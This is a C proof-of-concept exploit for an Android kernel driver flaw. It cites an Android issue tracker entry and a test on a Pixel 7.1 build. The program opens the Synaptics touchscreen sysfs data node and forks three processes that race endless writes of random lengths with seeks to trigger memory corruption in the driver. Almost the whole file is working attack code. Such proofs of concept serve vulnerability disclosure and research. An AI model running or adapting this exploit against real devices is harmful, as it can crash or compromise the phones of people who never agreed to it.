/*
 * https://code.google.com/p/android/issues/detail?id=228012
 * The poc was tested in pixel : google/sailfish/sailfish:7.1/NDE63L/3273814:user/release-keys
 * chengjia4574@gmail.com 20161118
*/
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>

#define REG_ADDR_LIMIT 4096
int race_write(int fd)
{
	int ret, i;
	pid_t pid;
	char data[REG_ADDR_LIMIT] = {0};

	pid = fork();

	if(pid < 0) {}
	else if(pid == 0) {
		while(1) {
			lseek(fd, 0 , SEEK_SET);
			ret = write(fd, data, 8);
			if(ret<0) {
				printf("write fail %s\n",strerror(errno));
			} else printf("pid %d succ write %d byte\n",getpid(), ret);
		}
	} else {

		pid = fork();
		if(pid<0) {}
		else if(pid == 0) {
			while(1) {
				ret = write(fd, data, (rand() % REG_ADDR_LIMIT));
				if(ret<0) {
					printf("write fail %s\n",strerror(errno));
				} else printf("pid %d succ write %d byte\n",getpid(),ret);
			}
		} else {
			while(1) {
				lseek(fd, 0 , SEEK_SET);
				ret = write(fd, data, (rand() % REG_ADDR_LIMIT));
				//ret = write(fd, data, 0xff00);
				if(ret<0) {
					printf("write fail %s\n",strerror(errno));
				} else printf("pid %d succ write %d byte\n",getpid(),ret);
			}
		}
	}

	return 0;
}

	int
main(int argc, char *argv[])
{
	int ret;
	char *path = "/sys/devices/soc/7577000.i2c/i2c-3/3-0020/input/input3/rmidev/data";
	int fd;
	fd = open(path, O_RDWR);
	if(fd<0) {
		printf("open %s fail %s\n",path, strerror(errno));
		return -1;
	}
	printf("open %s succ\n",path);
	race_write(fd);	
	close(fd);

	return 0;
}
